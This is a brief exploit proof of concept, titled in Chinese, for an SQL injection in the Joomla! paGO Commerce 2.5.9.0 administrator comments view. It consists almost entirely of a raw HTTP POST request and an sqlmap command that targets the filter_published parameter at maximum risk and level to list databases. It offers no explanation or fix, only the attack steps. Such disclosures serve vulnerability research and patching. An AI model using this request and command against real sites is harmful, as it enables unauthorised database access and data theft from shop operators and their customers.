# Joomla! paGO Commerce 2.5.9.0 存在SQL 注⼊



```
 POST /joomla/administrator/index.php?option=com_pago&view=comments HTTP/1.1
2 Host: localhost
3 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0
4 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8
5 Accept-Language: tr-TR,tr;q=0.8,en-US;q=0.5,en;q=0.3
6 Accept-Encoding: gzip, deflate
7 Content-Type: application/x-www-form-urlencoded
8 Content-Length: 163
9 Origin: http://localhost
10 Connection: close
11 Referer: http://localhost/joomla/administrator/index.php?option=com_pago&view=comments
12 Cookie: 4bde113dfc9bf88a13de3b5b9eabe495=sp6rp5mqnihh2i323r57cvesoe; crisp-client%2Fsession%2F0
13 Upgrade-Insecure-Requests: 1
14
15 filter_search=&limit=10&filter_published=1&task=&controller=comments&boxchecked=0&filter_order= 
​```POC```
 sqlmap -r pago --dbs --risk=3 --level=5 --random-agent -p filter_published 
```